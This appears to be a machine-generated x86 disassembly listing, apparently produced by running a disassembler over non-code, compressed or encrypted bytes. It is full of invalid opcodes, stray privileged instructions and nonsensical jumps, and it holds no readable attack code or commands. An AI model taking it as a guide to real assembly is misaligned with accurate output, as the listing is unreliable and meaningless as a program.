  423b36:	or     eax,0x45dc2567
  423b3b:	push   edx
  423b3c:	cmp    bl,BYTE PTR [eax*4+0xaee2833]
  423b43:	dec    ebp
  423b44:	adc    eax,0x1382e933
  423b49:	adc    eax,0x86ef2205
  423b4e:	mov    dh,0x4b
  423b50:	sub    eax,0x61cc481f
  423b55:	sub    BYTE PTR [ebx],dh
  423b57:	jecxz  0x423aec
  423b59:	sub    eax,0x55f0b21d
  423b5e:	pusha  
  423b5f:	mov    esi,0x736cb78c
  423b64:	inc    DWORD PTR [edi-0x47]
  423b67:	lock xchg esp,eax
  423b69:	inc    ebx
  423b6a:	cmp    BYTE PTR [ebx+edx*1-0x7a],ch
  423b6e:	ror    BYTE PTR [edi+eax*8+0x325db0f4],0x92
  423b76:	lock and al,0xc1
  423b79:	out    dx,al
  423b7a:	hlt    
  423b7b:	addr16 add eax,0x84a957b3
  423b81:	sbb    al,0xe0
  423b83:	xor    al,bh
  423b85:	mov    DWORD PTR [edx-0x5de2fb5e],0xd6a3ab1b
  423b8f:	cs inc ecx
  423b91:	(bad)  
  423b92:	pusha  
  423b93:	push   edi
  423b94:	push   esp
  423b95:	adc    bl,BYTE PTR [ecx-0x1c]
  423b98:	ins    DWORD PTR es:[edi],dx
  423b99:	test   DWORD PTR [ebx-0x2e],edi
  423b9c:	sub    al,0x33
  423b9e:	pushf  
  423b9f:	push   gs
  423ba1:	shr    DWORD PTR cs:[edi],1
  423ba4:	test   DWORD PTR [ecx-0x1c],esi
  423ba7:	je     0x423bfa
  423ba9:	fdivr  QWORD PTR [esi]
  423bab:	fimul  WORD PTR [edx]
  423bad:	jle    0x423b70
  423baf:	out    dx,eax
  423bb0:	or     ebx,DWORD PTR [ecx-0x63]
  423bb3:	xchg   BYTE PTR [ecx+eiz*2],cl
  423bb6:	adc    eax,0x8f135ce
  423bbb:	xor    DWORD PTR [esi],eax
  423bbd:	test   al,0x48
  423bbf:	adc    al,0x3c
  423bc1:	xchg   ebp,eax
  423bc2:	xlat   BYTE PTR ds:[ebx]
  423bc3:	xchg   ecx,eax
  423bc4:	cmc    
  423bc5:	ret    
  423bc6:	out    dx,al
  423bc7:	cmp    DWORD PTR [ecx-0x38385f18],eax
  423bcd:	retf   
  423bce:	and    al,0x34
  423bd0:	pop    ds
  423bd1:	stos   BYTE PTR es:[edi],al
  423bd2:	push   0x26
  423bd4:	nop
  423bd5:	ins    BYTE PTR es:[edi],dx
  423bd6:	or     ebx,edi
  423bd8:	(bad)  
  423bd9:	shl    DWORD PTR [esi],1
  423bdb:	mov    ch,0x8d
  423bdd:	mov    bl,0x8
  423bdf:	or     BYTE PTR [ebx],dh
  423be1:	mov    ah,0x78
  423be3:	xlat   BYTE PTR ds:[ebx]
  423be4:	pop    esp
  423be5:	pop    ebp
  423be6:	pop    edx
  423be7:	cmp    ebp,0x7
  423bea:	fwait
  423beb:	in     eax,0xb8
  423bed:	icebp  
  423bee:	dec    edx
  423bef:	rcr    bl,0xd2
  423bf2:	jg     0x423bc9
  423bf4:	aaa    
  423bf5:	stos   DWORD PTR es:[edi],eax
  423bf6:	das    
  423bf7:	mov    ds:0x5d276285,eax
  423bfc:	or     eax,0xc5e8a2b2
  423c01:	mov    WORD PTR [esi-0x5],ds
  423c04:	cmc    
  423c05:	or     DWORD PTR [ebx+0x49],esi
  423c08:	fld    TBYTE PTR [edi]
  423c0a:	fcomp  QWORD PTR [esi]
  423c0c:	sbb    bh,bh
  423c0e:	dec    edi
  423c0f:	pop    edi
  423c10:	inc    ecx
  423c11:	add    DWORD PTR [ebx+0x2f],esi
  423c14:	xor    dl,BYTE PTR [ebx+0x2e24861a]
  423c1a:	or     BYTE PTR [esi+0x7a],ch
  423c1d:	add    BYTE PTR [ecx],dl
  423c1f:	jle    0x423bbd
  423c21:	mov    ecx,0x9a0aefe0
  423c26:	push   ecx
  423c27:	retf   0x90e8
  423c2a:	repnz retf 
  423c2c:	ret    0x1e91
  423c2f:	jae    0x423c17
  423c31:	or     eax,0x8607e9f4
  423c36:	sub    eax,0xb4754ff3
  423c3b:	mov    edi,0x3223a002
  423c40:	jg     0x423bcd
  423c42:	imul   eax,eax,0x1f
  423c45:	xor    DWORD PTR [ebx],esi
  423c47:	jmp    0xfd638fcf
  423c4c:	mov    bh,0xaa
  423c4e:	mov    ebp,0x8d0a290e
  423c53:	xor    cl,BYTE PTR [eax]
  423c55:	xorps  xmm3,XMMWORD PTR [ebp+eiz*2+0x5fe2d7b4]
  423c5d:	xor    bh,BYTE PTR [edi]
  423c5f:	adc    ch,BYTE PTR [eax+0x3bb8e33a]
  423c65:	mov    bh,0x29
  423c67:	mov    es,WORD PTR [ebx+0x55]
  423c6a:	mov    ?,WORD PTR [edx]
  423c6c:	out    dx,al
  423c6d:	and    edi,esp
  423c6f:	mov    ebp,0x719697dc
  423c74:	sub    al,0x58
  423c76:	and    al,0x7a
  423c78:	dec    esi
  423c79:	mov    ecx,0xdcaf7a94
  423c7e:	xchg   ebx,eax
  423c7f:	mov    WORD PTR [ecx],ds
  423c81:	or     dh,bh
  423c83:	repnz loope 0x423ce2
  423c86:	sbb    DWORD PTR [edx*2+0x5532c841],esi
  423c8d:	cmp    ebx,DWORD PTR [ebp+0x6832d044]
  423c93:	lds    esi,FWORD PTR [edx-0xcc8682f]
  423c99:	mov    ch,0x7
  423c9b:	pop    esp
  423c9c:	(bad)  
  423c9d:	mov    ds:0xe44e7cd2,al
  423ca2:	lock mov eax,ds:0x49a39246
  423ca8:	dec    ebp
  423ca9:	add    BYTE PTR [esi-0x3b],dl
  423cac:	push   ds
  423cad:	popa   
  423cae:	push   esi
  423caf:	in     eax,0x68
  423cb1:	enter  0x44f7,0xc6
  423cb5:	mov    edi,0x6de27d64
  423cba:	adc    BYTE PTR [ebx],bh
  423cbc:	retf   
  423cbd:	pop    edi
  423cbe:	jnp    0x423cb8
  423cc0:	push   ecx
  423cc1:	jno    0x423c6b
  423cc3:	fcom   DWORD PTR [ebx+0x89d483]
  423cc9:	and    cl,BYTE PTR [esi+0x60]
  423ccc:	scas   al,BYTE PTR es:[edi]
  423ccd:	xchg   edi,eax
  423cce:	cmp    dh,ch
  423cd0:	mov    edi,0xc8a6bab
  423cd5:	loopne 0x423c87
  423cd7:	or     DWORD PTR [edx],0x2af42651
  423cdd:	jmp    0x423ca6
  423cdf:	shl    cl,1
  423ce1:	dec    ebp
  423ce2:	retf   
  423ce3:	add    ebp,DWORD PTR [eax]
  423ce5:	ins    BYTE PTR es:[edi],dx
  423ce6:	in     al,0x6e
  423ce8:	jae    0x423d31
  423cea:	add    BYTE PTR [esi+0x20],al
  423ced:	aas    
  423cee:	pop    edx
  423cef:	rcl    BYTE PTR [ebp+0x4baf14e7],1
  423cf5:	push   edx
  423cf6:	mov    bh,BYTE PTR [edi+0x30]
  423cf9:	fs sub eax,0x8c394bc3
  423cff:	add    ch,bl
  423d01:	rcl    DWORD PTR [edi+edx*8+0x120f85c8],1
  423d08:	rol    BYTE PTR fs:[ecx-0x77],1
  423d0c:	inc    edx
  423d0d:	shl    BYTE PTR [esi],cl
  423d0f:	and    ecx,0xffffff83
  423d12:	scas   eax,DWORD PTR es:[edi]
  423d13:	adc    ah,BYTE PTR [eax]
  423d15:	and    BYTE PTR [ebx+eax*4-0x3e6f668d],al
  423d1c:	dec    eax
  423d1d:	mov    edx,?
  423d1f:	call   FWORD PTR [esi-0x21]
  423d22:	xchg   DWORD PTR [eax+0x684bd589],edx
  423d28:	out    0x13,al
  423d2a:	mov    ecx,?
  423d2c:	ficomp WORD PTR [eax-0x5a]
  423d2f:	sbb    bh,BYTE PTR [esi+0x1b1a6255]
  423d35:	add    al,0xca
  423d37:	iret   
  423d38:	and    edi,DWORD PTR [eax+0x75fc5c29]
  423d3e:	push   cs
  423d3f:	es jecxz 0x423d54
  423d42:	hlt    
  423d43:	push   edi
  423d44:	xor    DWORD PTR [esi],esi
  423d46:	and    eax,0xee28ff82
  423d4b:	inc    ebx
  423d4c:	xor    bh,BYTE PTR [ebp+0x3745e9bd]
  423d52:	add    BYTE PTR [ebx+0x1b],bl
  423d55:	mov    ch,0x31
  423d57:	xor    dl,BYTE PTR [eax-0x6]
  423d5a:	jmp    0x423d9e
  423d5c:	mov    ebp,DWORD PTR [edi-0x4024487d]
  423d62:	pop    edi
  423d63:	cmp    al,0x11
  423d65:	pop    es
  423d66:	dec    edx
  423d67:	outs   dx,BYTE PTR ds:[esi]
  423d68:	pusha  
  423d69:	inc    ecx
  423d6a:	jge    0x423d49
  423d6c:	jle    0x423d81
  423d6e:	push   0xffffffb7
  423d70:	sbb    ebp,esp
  423d72:	lahf   
  423d73:	cmp    esi,DWORD PTR [ebx-0x16a15848]
  423d79:	retf   
  423d7a:	call   0x7cb0ffe5
  423d7f:	call   0x4510557d
  423d84:	test   BYTE PTR [eax+0x2c7dd985],al
  423d8a:	fcomp  DWORD PTR [edi+0x5d]
  423d8d:	mov    al,ds:0xec73ec91
  423d92:	stos   DWORD PTR es:[edi],eax
  423d93:	mov    ds:0xf1d9a5c6,al
  423d98:	retf   
  423d99:	cs retf 
  423d9b:	ja     0x423dce
  423d9d:	pop    ebx
  423d9e:	add    dh,BYTE PTR [eiz*1-0x6a4886ef]
  423da5:	sub    al,0x6e
  423da7:	xchg   ecx,eax
  423da8:	sub    al,BYTE PTR [esi-0x5b]
  423dab:	push   es
  423dac:	dec    esp
  423dad:	retf   0x41ea
  423db0:	les    edi,FWORD PTR [edi]
  423db2:	aad    0x7f
  423db4:	jo     0x423dc8
  423db6:	ror    DWORD PTR [edi+0x83],cl
  423dbc:	ins    BYTE PTR es:[edi],dx
  423dbd:	sub    ch,BYTE PTR [ebx]
  423dbf:	outs   dx,DWORD PTR es:[esi]
  423dc1:	daa    
  423dc2:	ins    DWORD PTR es:[edi],dx
  423dc3:	push   0xfffffff2
  423dc5:	push   esp
  423dc6:	stos   DWORD PTR es:[edi],eax
  423dc7:	adc    edx,eax
  423dc9:	in     al,dx
  423dca:	push   ss
  423dcb:	daa    
  423dcc:	mov    ds:0x850001b7,al
  423dd1:	add    al,BYTE PTR [eax]
  423dd3:	add    ah,dh
  423dd5:	adc    DWORD PTR [eax],ebx
  423dd7:	pusha  
  423dd8:	pop    ss
  423dd9:	xchg   edi,eax
  423dda:	sub    eax,0x11b54fae
  423ddf:	jge    0x423d9c
  423de1:	enter  0x5979,0x3f
  423de5:	loopne 0x423d90
  423de7:	mov    ebp,0x61ce773b
  423dec:	dec    esi
  423ded:	mov    al,ds:0x722ef712
  423df2:	pop    esp
  423df3:	jl     0x423e67
  423df5:	jmp    0xe0bce439
  423dfa:	or     DWORD PTR [ebp-0x1c],eax
  423dfd:	push   esi
  423dfe:	(bad)  
  423dff:	mov    ecx,edi
  423e01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e02:	add    BYTE PTR [edi-0x5692ee0d],0xe
  423e09:	adc    ah,BYTE PTR [edx+0x3f517eac]
  423e0f:	int3   
  423e10:	xlat   BYTE PTR ds:[ebx]
  423e11:	dec    edx
  423e12:	push   edi
  423e13:	jo     0x423db9
  423e15:	stos   BYTE PTR es:[edi],al
  423e16:	stos   DWORD PTR es:[edi],eax
  423e17:	dec    ecx
  423e18:	jo     0x423da7
  423e1a:	sbb    BYTE PTR [esi-0x7f],dl
  423e1d:	dec    ebp
  423e1e:	fsubr  QWORD PTR [ebp+0x45]
  423e21:	call   0x331ce1af
  423e26:	jecxz  0x423dc3
  423e28:	test   DWORD PTR [edx-0x10],esp
  423e2b:	in     al,0x59
  423e2d:	inc    edi
  423e2e:	jmp    0x423e65
  423e30:	loope  0x423e53
  423e32:	xchg   esi,eax
  423e33:	popf   
  423e34:	sbb    esi,esi
  423e36:	and    al,0x5d
  423e38:	je     0x423e45
  423e3a:	int3   
  423e3b:	mov    al,0x31
  423e3d:	push   0x31743df6
  423e42:	mov    ebx,0x55fe06b3
  423e47:	les    edx,FWORD PTR [edx-0x627addb2]
  423e4d:	fistp  QWORD PTR [eax+edi*4+0xaa73c09]
  423e54:	sbb    edi,DWORD PTR [ebx]
  423e56:	loope  0x423e1f
  423e58:	popf   
  423e59:	pop    eax
  423e5a:	int3   
  423e5b:	mov    WORD PTR [ebx-0x47],ss
  423e5e:	xor    BYTE PTR [ebp-0x55d2ae5b],bh
  423e64:	ins    DWORD PTR es:[edi],dx
  423e65:	dec    edx
  423e66:	ret    
  423e67:	sar    DWORD PTR [ebx+0x36],cl
  423e6a:	sbb    DWORD PTR [eax+ebp*4+0x64],ebp
  423e6e:	mov    DWORD PTR [esi+0x75],ecx
  423e71:	arpl   WORD PTR ss:[edi-0x53],si
  423e75:	pop    ss
  423e76:	mov    edx,0xd7305263
  423e7b:	das    
  423e7c:	ja     0x423ea6
  423e7e:	and    dl,dl
  423e80:	idiv   BYTE PTR [eax-0x69d5bfbb]
  423e86:	jle    0x423e4c
  423e88:	xor    DWORD PTR [ebx-0x69],ecx
  423e8b:	popa   
  423e8c:	lds    esp,FWORD PTR [eax-0x15d2da3]
  423e92:	and    BYTE PTR es:[ebp+0xc6cc94d],ch
  423e99:	fcmovnb st,st(4)
  423e9b:	shl    DWORD PTR [ecx+0x6d],0x1f
  423e9f:	mov    esi,0x88dec7da
  423ea4:	mov    ebx,0xfbe5f520
  423ea9:	stc    
  423eaa:	adc    esp,edi
  423eac:	add    edx,DWORD PTR [edx+0x57a0a224]
  423eb2:	cld    
  423eb3:	pop    ss
  423eb4:	xchg   BYTE PTR [edx-0x176faa08],ah
  423eba:	sti    
  423ebb:	(bad)  [edi]
  423ebd:	jg     0x423f3a
  423ebf:	sbb    eax,0x6b51032e
  423ec4:	push   ebx
  423ec5:	sub    ebp,DWORD PTR [edx+0x1f]
  423ec8:	(bad)  
  423ec9:	and    ebx,edi
  423ecb:	sub    DWORD PTR [esp+esi*1],0x218ea4b3
  423ed2:	pop    eax
  423ed3:	pop    ds
  423ed4:	mov    ecx,0xdd5b8e3f
  423ed9:	inc    edi
  423eda:	fs mov edi,0xc9140bc
  423ee0:	mov    ds:0xedd39b72,al
  423ee5:	aad    0xe7
  423ee7:	xchg   ebp,eax
  423ee8:	out    0x69,al
  423eea:	std    
  423eeb:	pop    ebx
  423eec:	(bad)  
  423eed:	ficomp DWORD PTR [edx+0x6f]
  423ef0:	iret   
  423ef1:	mov    ch,BYTE PTR [esi+0x11dade3f]
  423ef7:	push   cs
  423ef8:	adc    DWORD PTR [esi-0x1c],ebx
  423efb:	enter  0xc93b,0x41
  423eff:	loopne 0x423f26
  423f01:	shl    DWORD PTR [ebx+edx*8],cl
  423f04:	jge    0x423efd
  423f06:	ins    DWORD PTR es:[edi],dx
  423f07:	push   0x1b
  423f09:	jno    0x423f17
  423f0b:	mov    ds:0xb47b7f06,al
  423f10:	sahf   
  423f11:	rol    DWORD PTR [ecx],1
  423f13:	popf   
  423f14:	sbb    BYTE PTR [esi],cl
  423f16:	push   edx
  423f17:	leave  
  423f18:	test   eax,0xb47b0ace
  423f1d:	inc    ecx
  423f1e:	jae    0x423ed1
  423f20:	xor    eax,0xf37c460
  423f25:	sti    
  423f26:	das    
  423f27:	mov    BYTE PTR [esi+0x6f8296b8],ah
  423f2d:	(bad)  
  423f2e:	gs or  al,0x1d
  423f31:	mov    al,0x7b
  423f33:	div    DWORD PTR [ecx+0x302047ab]
  423f39:	xor    BYTE PTR [esi+0x59],dl
  423f3c:	jns    0x423f09
  423f3e:	jbe    0x423ec7
  423f40:	xlat   BYTE PTR ds:[ebx]
  423f41:	inc    edx
  423f43:	mov    al,0xd2
  423f45:	repnz adc DWORD PTR [eax-0x7d],edi
  423f49:	icebp  
  423f4a:	adc    ebp,DWORD PTR [ebp+0xa]
  423f4d:	mov    ebx,0xa9dbaa84
  423f52:	xchg   esi,eax
  423f53:	test   eax,0x4aab07b8
  423f58:	sub    BYTE PTR [edx],al
  423f5a:	lods   eax,DWORD PTR ds:[esi]
  423f5b:	inc    edi
  423f5c:	push   esp
  423f5d:	mov    ch,0x6a
  423f5f:	repnz and eax,0xbd3e92cc
  423f65:	push   edi
  423f66:	xchg   DWORD PTR [esi+0x7e658dc1],ecx
  423f6c:	mov    bh,0x1d
  423f6e:	inc    edx
  423f6f:	fst    DWORD PTR ds:0x5132f568
  423f75:	pop    es
  423f76:	adc    al,0x68
  423f78:	jne    0x423fc3
  423f7a:	push   ss
  423f7b:	cmp    DWORD PTR [esi+0x7f],esi
  423f7e:	add    al,0xa8
  423f80:	pop    ss
  423f81:	dec    esp
  423f82:	lods   al,BYTE PTR ds:[esi]
  423f83:	pushf  
  423f84:	pop    edx
  423f85:	sbb    cl,BYTE PTR [ebx-0x15ff1708]
  423f8b:	jmp    0x907514c0
  423f90:	idiv   DWORD PTR [ebx-0x38]
  423f93:	(bad)  
  423f94:	sar    BYTE PTR [esp+edi*8],0x33
  423f98:	hlt    
  423f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f9a:	rcr    BYTE PTR [esi+0x56],0x90
  423f9e:	aam    0x4d
  423fa0:	lea    eax,[edx-0x2723dac8]
  423fa6:	add    ch,0x2c
  423fa9:	dec    edi
  423faa:	ja     0x42401d
  423fac:	dec    ebp
  423fad:	push   0xffffff84
  423faf:	or     al,0xf8
  423fb1:	out    0x70,al
  423fb3:	inc    eax
  423fb4:	push   ecx
  423fb5:	cmp    eax,0x8dba31c9
  423fba:	retf   0x3a86
  423fbd:	mov    bl,0x99
  423fbf:	xchg   ecx,eax
  423fc0:	loop   0x42400f
  423fc2:	(bad)  
  423fc3:	cdq    
  423fc4:	inc    edi
  423fc5:	leave  
  423fc6:	loope  0x424036
  423fc8:	and    ebx,DWORD PTR [ebx]
  423fca:	push   ds
  423fcb:	cwde   
  423fcc:	or     BYTE PTR [eax+eiz*1+0x7c],dh
  423fd0:	jle    0x423f83
  423fd2:	inc    esp
  423fd3:	sub    BYTE PTR [ecx],dl
  423fd5:	xchg   ecx,eax
  423fd6:	mov    DWORD PTR [ebx-0x7f0a64b7],0xd2022af4
  423fe0:	pop    ss
  423fe1:	(bad)  
  423fe2:	xlat   BYTE PTR ds:[ebx]
  423fe3:	sbb    al,0xb4
  423fe5:	push   esi
  423fe6:	fist   WORD PTR [eax]
  423fe8:	arpl   si,di
  423fea:	enter  0x5888,0xb5
  423fee:	dec    edi
  423fef:	pop    es
  423ff0:	xchg   ebx,eax
  423ff1:	sbb    eax,0xa020adee
  423ff6:	enter  0x34b8,0x2b
  423ffa:	mov    ds:0x97d91b43,al
  423fff:	repz aam 0x5e
  424002:	and    al,0x57
  424004:	icebp  
  424005:	push   eax
  424006:	leave  
  424007:	test   DWORD PTR [eax],edi
  424009:	sbb    DWORD PTR [ebx],ebx
  42400b:	xchg   DWORD PTR [ecx+0x514252df],esp
  424011:	sbb    ch,BYTE PTR [ebx+0x22e3fb9b]
  424017:	push   ds
  424018:	sub    al,0x77
  42401a:	jns    0x423fb9
  42401c:	lahf   
  42401d:	xchg   ebx,eax
  42401e:	arpl   WORD PTR ds:0x52b5705e,sp
  424024:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  424026:	sub    eax,0x194f779e
  42402b:	lea    ebp,[edx+0x7e0448d2]
  424031:	(bad)  
  424032:	fsub   DWORD PTR ds:0x98c1a3f5
  424038:	pop    edx
  424039:	sbb    ch,BYTE PTR [esp+edi*1+0x3c14688b]
  424040:	pop    ebp
  424041:	jl     0x4240a2
  424043:	lds    esi,FWORD PTR [esi]
  424045:	push   0xffffff8b
  424047:	inc    esi
  424048:	imul   esp,DWORD PTR [ebx+0x7211312f],0xccb80264
  424052:	dec    esp
  424053:	out    0xc6,eax
  424055:	xchg   esi,eax
  424056:	int3   
  424057:	add    DWORD PTR [esi],edi
  424059:	add    BYTE PTR [eax],al
  42405b:	add    BYTE PTR [ebx-0x73],al
  42405e:	pop    ds
  42405f:	and    bh,bl
  424061:	mov    dl,0x7f
  424063:	out    dx,eax
  424064:	add    BYTE PTR [ebx-0x6403d8f0],dl
  42406a:	xchg   edx,eax
  42406b:	mov    DWORD PTR [edi],esp
  42406d:	mov    edx,0x2850001
  424072:	add    BYTE PTR [eax],al
  424074:	mov    al,0x38
  424076:	int    0x83
  424078:	jno    0x4240a3
  42407a:	jo     0x4240dd
  42407c:	mov    WORD PTR [esi+0x255ec3a6],?
  424082:	lods   al,BYTE PTR ds:[esi]
  424083:	mov    eax,ds:0x2f9a9baa
  424088:	inc    esp
  424089:	push   0x70
  42408b:	ins    DWORD PTR es:[edi],dx
  42408c:	xchg   ebx,eax
  42408d:	std    
  42408e:	jge    0x42406a
  424090:	push   ebx
  424091:	int    0x4c
  424093:	or     DWORD PTR [eax-0x58da7907],ebx
  424099:	fadd   DWORD PTR [ecx-0x21]
  42409c:	test   al,0x4c
  42409e:	xchg   ebp,eax
  42409f:	aam    0x8b
  4240a1:	fidivr DWORD PTR [eax]
  4240a3:	or     al,0x6
  4240a5:	inc    esi
  4240a6:	cs retf 
  4240a8:	sbb    dl,BYTE PTR [ebx+0x6989be0a]
  4240ae:	add    eax,0x37e252ff
  4240b3:	mov    cl,bh
  4240b5:	sub    eax,0x39858854
  4240ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240bb:	inc    esi
  4240bc:	mul    DWORD PTR ss:0x5b63a3a5
  4240c3:	mov    ?,ebp
  4240c5:	rcl    BYTE PTR [eax+0x37],cl
  4240c8:	iret   
  4240c9:	bound  esp,QWORD PTR [eax+ebp*4-0x31]
  4240cd:	sar    DWORD PTR [ecx-0x76],cl
  4240d0:	jle    0x424088
  4240d2:	gs adc edi,esp
  4240d5:	lds    eax,FWORD PTR [eax-0x1c]
  4240d8:	dec    edx
  4240d9:	retf   0xd002
  4240dc:	add    bl,ah
  4240de:	out    dx,eax
  4240df:	sbb    esi,DWORD PTR [ebx]
  4240e1:	mov    ds:0x3ee146f0,al
  4240e6:	mov    al,0x86
  4240e8:	bound  edi,QWORD PTR [esi+0x57]
  4240eb:	cmp    esp,ecx
  4240ed:	push   ebx
  4240ee:	mov    ebx,0xf7d71abe
  4240f3:	out    dx,al
  4240f4:	ret    0x3959
  4240f7:	sub    eax,0xf990b260
  4240fc:	into   
  4240fd:	cmp    BYTE PTR [eax],cl
  4240ff:	loope  0x42412d
  424101:	mov    ds:0x65303570,al
  424106:	jb     0x4240b4
  424108:	mov    edi,edi
  42410a:	xor    eax,0xccad21c2
  42410f:	retf   0xd7a7
  424112:	lods   eax,DWORD PTR ds:[esi]
  424113:	sbb    BYTE PTR [ecx],al
  424115:	arpl   WORD PTR [ebp+0xa4c6f92],dx
  42411b:	sub    BYTE PTR [edx+ebp*2-0x61],cl
  42411f:	adc    DWORD PTR [ebx-0x2ea36527],eax
  424125:	xor    eax,0x7c78b797
  42412a:	in     al,dx
  42412b:	adc    BYTE PTR [ecx],dl
  42412d:	add    ecx,DWORD PTR [eax]
  42412f:	retf   0x7cb5
  424132:	and    al,0xf8
  424134:	(bad)  
  424136:	cmp    edi,esi
  424138:	(bad)  
  424139:	sub    ah,ch
  42413b:	mov    WORD PTR [edx-0xa2da70d],es
  424141:	dec    ebx
  424142:	mov    al,0x7b
  424144:	fisttp QWORD PTR [esi-0x48]
  424147:	or     ebp,esi
  424149:	data16 fwait
  42414b:	mov    ecx,0x6cbb8c19
  424150:	add    cl,BYTE PTR [ebx+0x5d]
  424153:	inc    esi
  424154:	adc    eax,0x693d58ad
  424159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42415a:	fdiv   DWORD PTR [edx+0x48102920]
  424160:	push   esp
  424161:	jmp    0xb408:0xef124121
  424168:	mov    cl,0x91
  42416a:	sub    al,al
  42416c:	fcomp  DWORD PTR [edx-0xa8b56ea]
  424172:	add    eax,0x981ff359
  424177:	outs   dx,BYTE PTR ds:[esi]
  424178:	popa   
  424179:	ret    0xb8e5
  42417c:	loope  0x424173
  42417e:	outs   dx,DWORD PTR ds:[esi]
  42417f:	and    eax,0x31c5bd77
  424184:	lods   eax,DWORD PTR ds:[esi]
  424185:	repnz std 
  424187:	fldenv [edi+0x18]
  42418a:	aam    0x53
  42418c:	xchg   ecx,eax
  42418d:	jg     0x4241d0
  42418f:	jmp    0x4241f9
  424191:	and    dh,dh
  424193:	mov    edi,0x9aea5137
  424198:	jb     0x42413e
  42419a:	das    
  42419b:	mov    esp,0xba8801b4
  4241a0:	(bad)  
  4241a2:	add    ebx,edx
  4241a4:	rcl    DWORD PTR ds:0xf9228264,cl
  4241aa:	mov    al,al
  4241ac:	out    dx,eax
  4241ad:	sti    
  4241ae:	xchg   ebp,eax
  4241af:	sub    ebx,esp
  4241b1:	or     bh,bl
  4241b3:	xor    bh,ch
  4241b5:	out    0x8b,eax
  4241b7:	aaa    
  4241b8:	or     eax,0x715ce699
  4241bd:	xlat   BYTE PTR ds:[ebx]
  4241be:	xor    DWORD PTR [edx+0x3e],ecx
  4241c1:	sbb    eax,0xfb8f8b89
  4241c6:	push   ss
  4241c7:	fisttp WORD PTR [ebx]
  4241c9:	lock mov bh,0xf9
  4241cc:	jp     0x4241b1
  4241ce:	in     eax,dx
  4241cf:	mov    edx,0xf359ada1
  4241d4:	sub    eax,0xae4515d
  4241d9:	sub    BYTE PTR [edx-0x52f643d8],cl
  4241df:	dec    edi
  4241e0:	push   ecx
  4241e1:	and    BYTE PTR ds:0x50839fbb,0x52
  4241e8:	sub    DWORD PTR [edi+eax*8+0x1c],0x67
  4241ed:	and    eax,0xf38df405
  4241f2:	or     ah,BYTE PTR [ebx]
  4241f4:	scas   al,BYTE PTR es:[edi]
  4241f5:	pop    eax
  4241f6:	sub    bh,dl
  4241f8:	sbb    edi,DWORD PTR [eax+ebp*8]
  4241fb:	daa    
  4241fc:	(bad)  
  4241fd:	add    al,0x93
  4241ff:	mov    al,BYTE PTR [eax+0xf]
  424202:	ror    BYTE PTR [ecx+edx*4-0xf9c38c0],0x5f
  42420a:	scas   al,BYTE PTR es:[edi]
  42420b:	mov    ebp,0x43812835
  424210:	mov    eax,0x3731cecc
  424215:	hlt    
  424216:	cmp    eax,0xbba416f3
  42421b:	and    ebx,DWORD PTR [esi]
  42421d:	stos   BYTE PTR es:[edi],al
  42421e:	fcom   QWORD PTR [edi+0x25698142]
  424224:	addr16 add al,0xa9
  424227:	into   
  424228:	cld    
  424229:	das    
  42422a:	in     al,dx
  42422b:	sbb    eax,0xacd9798e
  424230:	xchg   edi,eax
  424231:	or     al,0x22
  424233:	test   al,0xe3
  424235:	xor    esp,0x2952ce71
  42423b:	loop   0x4242a3
  42423d:	popf   
  42423e:	push   edx
  42423f:	jp     0x424242
  424241:	test   eax,0x899190b1
  424246:	je     0x424289
  424248:	pop    ebp
  424249:	mov    bl,0x19
  42424b:	popf   
  42424c:	retf   0xa05d
  42424f:	jns    0x4241fe
  424251:	push   cs
  424252:	push   ecx
  424253:	idiv   edx
  424255:	scas   eax,DWORD PTR es:[edi]
  424256:	mov    esp,ds
  424258:	xchg   edx,eax
  424259:	xor    DWORD PTR [ebx+0x18a8bd79],ebp
  42425f:	bound  edx,QWORD PTR [esi+0xd5dae42]
  424265:	cdq    
  424266:	fnstsw WORD PTR [esi-0x448657b]
  42426c:	push   esp
  42426d:	sub    BYTE PTR [esi+0x98d909b],0x3b
  424274:	stc    
  424275:	ja     0x4242a0
  424277:	mov    dh,0x6f
  424279:	push   esp
  42427a:	nop
  42427b:	je     0x424217
  42427d:	call   0x9948:0x140a7434
  424284:	mov    al,0x4b
  424286:	mov    dl,0xaa
  424288:	push   ss
  424289:	sbb    edi,DWORD PTR [edi]
  42428b:	in     eax,dx
  42428c:	(bad)  
  42428d:	jge    0x4242a5
  42428f:	(bad)  
  424290:	jp     0x424280
  424292:	arpl   ax,bp
  424294:	call   0x93fe8900
  424299:	test   eax,0x5e47efb9
  42429e:	push   edx
  42429f:	aas    
  4242a0:	dec    ebx
  4242a1:	cmp    BYTE PTR [edx+0x4f],bh
  4242a4:	sub    BYTE PTR gs:[esi],al
  4242a7:	cmp    ebp,DWORD PTR [esi-0x4ecb8056]
  4242ad:	sbb    ah,al
  4242af:	cmp    al,0x14
  4242b1:	push   eax
  4242b2:	das    
  4242b3:	mov    al,0xad
  4242b5:	ja     0x424249
  4242b7:	xchg   esp,eax
  4242b8:	xor    edi,DWORD PTR [ebp+0x4c]
  4242bb:	mov    edx,0x756f7022
  4242c0:	inc    edi
  4242c1:	jne    0x42427d
  4242c3:	or     al,cl
  4242c5:	into   
  4242c6:	imul   edi,DWORD PTR [eax+eax*4],0x6
  4242ca:	std    
  4242cb:	xor    BYTE PTR [esi],cl
  4242cd:	mov    esi,0x7dc2563
  4242d2:	xchg   edx,eax
  4242d3:	fmul   st(3),st
  4242d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242d6:	int    0x77
  4242d8:	mov    BYTE PTR [ecx+0x70],dl
  4242db:	xor    al,0x1e
  4242dd:	lock lea ebp,[esi+0x2f3fea2c]
  4242e4:	xchg   edx,eax
  4242e5:	pop    ebp
  4242e6:	dec    eax
  4242e7:	in     eax,0xdf
  4242e9:	sub    ebp,esi
  4242eb:	pop    edx
  4242ec:	stos   DWORD PTR es:[edi],eax
  4242ed:	push   edx
  4242ee:	(bad)  
  4242ef:	idiv   ebp
  4242f1:	in     eax,0xd6
  4242f3:	and    ecx,edi
  4242f5:	sub    bh,BYTE PTR [ebp+0xa32]
  4242fb:	add    ah,dh
  4242fd:	cmp    DWORD PTR [edx-0x2002081],edx
  424303:	mov    ebx,0xc0721507
  424308:	popa   
  424309:	cmp    al,BYTE PTR [edi+esi*2+0x1bcac]
  424310:	test   DWORD PTR [edx],eax
  424312:	add    BYTE PTR [eax],al
